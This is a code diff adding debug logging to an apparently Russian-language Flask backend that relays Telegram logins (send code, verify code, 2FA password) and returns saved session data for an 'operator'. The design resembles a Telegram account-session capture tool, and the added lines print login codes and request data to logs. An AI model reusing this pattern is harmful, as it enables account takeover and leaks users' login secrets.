@@ -13,6 +13,7 @@ import time
 import hashlib
 import fcntl
 import atexit
+import traceback
 
 app = Flask(__name__)
 CORS(app)  # Разрешаем CORS для всех доменов
@@ -176,17 +177,22 @@ def health_check():
 @app.route('/api/auth/send-code', methods=['POST'])
 def send_code():
     try:
+        print("📥 Получен запрос на отправку кода")
         data = request.get_json()
+        print(f"📋 Данные запроса: {json.dumps(data, indent=2)}")
+        
         phone = data.get('phone')
         operator = data.get('operator')
         
         if not phone or not operator:
+            print("❌ Отсутствуют обязательные параметры")
             return jsonify({'success': False, 'error': 'Phone and operator are required'})
         
         print(f"📞 ОТПРАВКА КОДА для {phone}, оператор: {operator}")
         
         async def send_code_async():
             try:
+                print("🔧 Создаем/получаем клиента...")
                 # Создаем или получаем клиента
                 client = await get_or_create_client(operator, phone)
                 
@@ -195,6 +201,8 @@ def send_code():
                 # Отправляем код
                 result = await client.send_code_request(phone)
                 phone_code_hash = result.phone_code_hash
+                
+                print(f"✅ Код отправлен. phone_code_hash: {phone_code_hash[:20]}...")
                 
                 # Сохраняем phone_code_hash для последующего использования
                 phone_code_hashes[f"{operator}_{phone}"] = phone_code_hash
@@ -208,43 +216,54 @@ def send_code():
                 
             except Exception as e:
                 print(f"❌ ОШИБКА ОТПРАВКИ КОДА: {e}")
+                print(f"❌ TRACEBACK: {traceback.format_exc()}")
                 return {'success': False, 'error': str(e)}
         
         result = run_async_safely(send_code_async())
+        print(f"🎯 Результат отправки кода: {json.dumps(result, indent=2)}")
         return jsonify(result)
         
     except Exception as e:
-        print(f"💥 КРИТИЧЕСКАЯ ОШИБКА: {str(e)}")
+        print(f"💥 КРИТИЧЕСКАЯ ОШИБКА в send_code: {str(e)}")
+        print(f"💥 TRACEBACK: {traceback.format_exc()}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/auth/verify', methods=['POST'])
 def verify_code():
     try:
+        print("📥 Получен запрос на проверку кода")
         data = request.get_json()
+        print(f"📋 Данные запроса проверки: {json.dumps(data, indent=2)}")
+        
         phone = data.get('phone')
         code = data.get('code')
         phone_code_hash = data.get('phone_code_hash')
         operator = data.get('operator')
         
         if not all([phone, code, phone_code_hash, operator]):
+            print("❌ Отсутствуют обязательные параметры для проверки")
             return jsonify({'success': False, 'error': 'All fields are required'})
         
         print(f"🔐 ПРОВЕРКА КОДА {code} для {phone}")
         
         async def verify_code_async():
             try:
+                print("🔧 Получаем клиента для проверки...")
                 # Получаем клиента
                 client = await get_or_create_client(operator, phone)
                 
                 print(f"🚀 ПРОВЕРЯЕМ КОД через Telegram API...")
+                print(f"🔐 Параметры: phone={phone}, code={code}, phone_code_hash={phone_code_hash[:20] if phone_code_hash else 'None'}...")
                 
                 # Проверяем код
                 try:
                     user = await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                     print(f"✅ КОД ПРИНЯТ для {phone}")
+                    print(f"✅ Пользователь: {user.first_name if hasattr(user, 'first_name') else 'Неизвестно'}")
                     
                     # Получаем данные сессии
                     session_data = client.session.save()
+                    print(f"✅ Сессия сохранена, длина: {len(session_data) if session_data else 0}")
                     
                     return {
                         'success': True,
@@ -263,18 +282,22 @@ def verify_code():
                 
             except Exception as e:
                 print(f"❌ ОШИБКА ПРОВЕРКИ КОДА: {e}")
+                print(f"❌ TRACEBACK: {traceback.format_exc()}")
                 return {'success': False, 'error': str(e)}
         
         result = run_async_safely(verify_code_async())
+        print(f"🎯 Результат проверки кода: {json.dumps(result, indent=2)}")
         return jsonify(result)
         
     except Exception as e:
-        print(f"💥 КРИТИЧЕСКАЯ ОШИБКА: {str(e)}")
+        print(f"💥 КРИТИЧЕСКАЯ ОШИБКА в verify_code: {str(e)}")
+        print(f"💥 TRACEBACK: {traceback.format_exc()}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/auth/password', methods=['POST'])
 def check_password():
     try:
+        print("📥 Получен запрос на проверку пароля 2FA")
         data = request.get_json()
         phone = data.get('phone')
         password = data.get('password')
@@ -307,13 +330,15 @@ def check_password():
                 
             except Exception as e:
                 print(f"❌ ОШИБКА ПРОВЕРКИ 2FA: {e}")
+                print(f"❌ TRACEBACK: {traceback.format_exc()}")
                 return {'success': False, 'error': str(e)}
         
         result = run_async_safely(check_password_async())
         return jsonify(result)
         
     except Exception as e:
-        print(f"💥 КРИТИЧЕСКАЯ ОШИБКА: {str(e)}")
+        print(f"💥 КРИТИЧЕСКАЯ ОШИБКА в check_password: {str(e)}")
+        print(f"💥 TRACEBACK: {traceback.format_exc()}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 # ============= ОСТАЛЬНЫЕ ЭНДПОИНТЫ =============
